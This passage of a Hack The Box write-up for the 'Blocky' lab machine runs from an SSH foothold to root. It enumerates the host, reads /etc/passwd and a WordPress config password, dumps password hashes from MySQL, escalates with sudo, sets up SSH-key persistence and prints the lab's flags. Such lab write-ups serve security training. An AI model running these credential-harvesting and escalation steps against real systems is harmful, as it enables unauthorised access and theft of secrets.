+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.10.37 (10.10.10.37)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">notch@10.10.10.37&#39;s password:
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">notch@Blocky:~$
+</span></code></pre>
+<p>Nice!</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>notch</code> (obviously).</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Blocky's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Blocky is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
+</span><span class="z-text z-plain">DISTRIB_RELEASE=16.04
+</span><span class="z-text z-plain">DISTRIB_CODENAME=xenial
+</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.2 LTS&quot;
+</span></code></pre>
+<p>Okay, so it's Ubuntu 16.04.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Blocky.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.4.0-62-generic
+</span></code></pre>
+<p>It's <code>4.4.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">notch
+</span><span class="z-text z-plain">root
+</span></code></pre>
+<p>There's <code>notch</code> (us) and <code>root</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lpadmin
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">mlocate
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">notch
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sambashare
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-bus-proxy
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:bb:21  
+</span><span class="z-text z-plain">          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+</span><span class="z-text z-plain">          inet6 addr: fe80::250:56ff:feb9:bb21/64 Scope:Link
+</span><span class="z-text z-plain">          inet6 addr: dead:beef::250:56ff:feb9:bb21/64 Scope:Global
+</span><span class="z-text z-plain">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class="z-text z-plain">          RX packets:240920 errors:0 dropped:0 overruns:0 frame:0
+</span><span class="z-text z-plain">          TX packets:238806 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class="z-text z-plain">          collisions:0 txqueuelen:1000 
+</span><span class="z-text z-plain">          RX bytes:42200993 (42.2 MB)  TX bytes:116449470 (116.4 MB)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo        Link encap:Local Loopback  
+</span><span class="z-text z-plain">          inet addr:127.0.0.1  Mask:255.0.0.0
+</span><span class="z-text z-plain">          inet6 addr: ::1/128 Scope:Host
+</span><span class="z-text z-plain">          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span><span class="z-text z-plain">          RX packets:16519 errors:0 dropped:0 overruns:0 frame:0
+</span><span class="z-text z-plain">          TX packets:16519 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class="z-text z-plain">          collisions:0 txqueuelen:1 
+</span><span class="z-text z-plain">          RX bytes:1244580 (1.2 MB)  TX bytes:1244580 (1.2 MB)
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Blocky's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Blocky
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/notch/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">11ecd8af3ce4ee22a9392e37dd7b0198
+</span></code></pre>
+<h3 id="website-code-review">Website code review</h3>
+<p>Let's review the content of the Apache website, located at <code>/var/www/html</code>.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">/** The name of the database for WordPress */
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">/** MySQL database username */
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">define(&#39;DB_USER&#39;, &#39;wordpress&#39;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">/** MySQL database password */
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">define(&#39;DB_PASSWORD&#39;, &#39;kWuvW2SYsABmzywYRdoD&#39;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">/** MySQL hostname */
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span></code></pre>
+<p>The <code>wp-config.php</code> file contains credentials used to connect to the MariaDB
+database.</p>
+<h2 id="services-enumeration-1">Services enumeration</h2>
+<h3 id="mysql">MySQL</h3>
+<p>Let's connect to the MySQL server running locally using the Wordpress
+credentials:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> mysql<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>wordpress<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>kWuvW2SYsABmzywYRdoD<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">mysql&gt;
+</span></code></pre>
+<h4 id="version">Version</h4>
+<p>Let's find out the version of MySQL in use.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT @@version</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+-------------------------+
+</span><span class="z-text z-plain">| @@version               |
+</span><span class="z-text z-plain">+-------------------------+
+</span><span class="z-text z-plain">| 5.7.18-0ubuntu0.16.04.1 |
+</span><span class="z-text z-plain">+-------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>So it's MySQL version <code>5.7.18</code>.</p>
+<h4 id="databases">Databases</h4>
+<p>Now, let's see which databases are available.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW databases</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">| Database           |
+</span><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">| information_schema |
+</span><span class="z-text z-plain">| mysql              |
+</span><span class="z-text z-plain">| performance_schema |
+</span><span class="z-text z-plain">| phpmyadmin         |
+</span><span class="z-text z-plain">| sys                |
+</span><span class="z-text z-plain">| wordpress          |
+</span><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>wordpress</code> database is the probably the most interesting (it's also the one
+used by the website).</p>
+<h4 id="wordpress-s-tables"><code>wordpress</code>'s tables</h4>
+<p>Let's see which tables are included in this database.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW tables</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+-----------------------+
+</span><span class="z-text z-plain">| Tables_in_wordpress   |
+</span><span class="z-text z-plain">+-----------------------+
+</span><span class="z-text z-plain">| wp_commentmeta        |
+</span><span class="z-text z-plain">| wp_comments           |
+</span><span class="z-text z-plain">| wp_links              |
+</span><span class="z-text z-plain">| wp_options            |
+</span><span class="z-text z-plain">| wp_postmeta           |
+</span><span class="z-text z-plain">| wp_posts              |
+</span><span class="z-text z-plain">| wp_term_relationships |
+</span><span class="z-text z-plain">| wp_term_taxonomy      |
+</span><span class="z-text z-plain">| wp_termmeta           |
+</span><span class="z-text z-plain">| wp_terms              |
+</span><span class="z-text z-plain">| wp_usermeta           |
+</span><span class="z-text z-plain">| wp_users              |
+</span><span class="z-text z-plain">+-----------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's a few tables, but <code>wp_users</code> looks particularly noteworthy.</p>
+<h4 id="wp-users-s-columns"><code>wp_users</code>'s columns</h4>
+<p>Let's continue our enumeration of this database by checking the content of the
+<code>wp_users</code> table.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT column_type, column_name FROM information_schema.columns WHERE table_name = <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>wp_users<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+---------------------+---------------------+
+</span><span class="z-text z-plain">| column_type         | column_name         |
+</span><span class="z-text z-plain">+---------------------+---------------------+
+</span><span class="z-text z-plain">| bigint(20) unsigned | ID                  |
+</span><span class="z-text z-plain">| varchar(60)         | user_login          |
+</span><span class="z-text z-plain">| varchar(255)        | user_pass           |
+</span><span class="z-text z-plain">| varchar(50)         | user_nicename       |
+</span><span class="z-text z-plain">| varchar(100)        | user_email          |
+</span><span class="z-text z-plain">| varchar(100)        | user_url            |
+</span><span class="z-text z-plain">| datetime            | user_registered     |
+</span><span class="z-text z-plain">| varchar(255)        | user_activation_key |
+</span><span class="z-text z-plain">| int(11)             | user_status         |
+</span><span class="z-text z-plain">| varchar(250)        | display_name        |
+</span><span class="z-text z-plain">+---------------------+---------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so this table contains 10 columns.</p>
+<h4 id="wp-users-s-columns-content"><code>wp_users</code>'s columns content</h4>
+<p>Let's retrieve the content of the <code>user_login</code> and <code>user_pass</code> columns.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT user_login, user_pass FROM wp_users</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+------------+------------------------------------+
+</span><span class="z-text z-plain">| user_login | user_pass                          |
+</span><span class="z-text z-plain">+------------+------------------------------------+
+</span><span class="z-text z-plain">| Notch      | $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/ |
+</span><span class="z-text z-plain">+------------+------------------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Unfortunately, there's only <code>notch</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<h3 id="sudo-permissions">Sudo permissions</h3>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Matching Defaults entries for notch on Blocky:
+</span><span class="z-text z-plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">User notch may run the following commands on Blocky:
+</span><span class="z-text z-plain">    (ALL : ALL) ALL
+</span></code></pre>
+<p>We can run anything as <code>root</code>!</p>
+<h2 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h2>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's get an elevated shell:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">notch@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>su<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>-<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root@Blocky:~#
+</span></code></pre>
+<p>Yay!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Blocky as <code>root</code>.</p>
+<h2 id="system-enumeration-2">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@Blocky:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">70966d68d0867f2024b5ff85915c095a
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/blocky/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Easy' and the root flag as 'Very easy'. The foothold
+was not so easy to find, but straightforward to exploit. I found it really
+interesting too, and quite realistic. The privilege escalation was extremely
+easy, and trivial to exploit.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
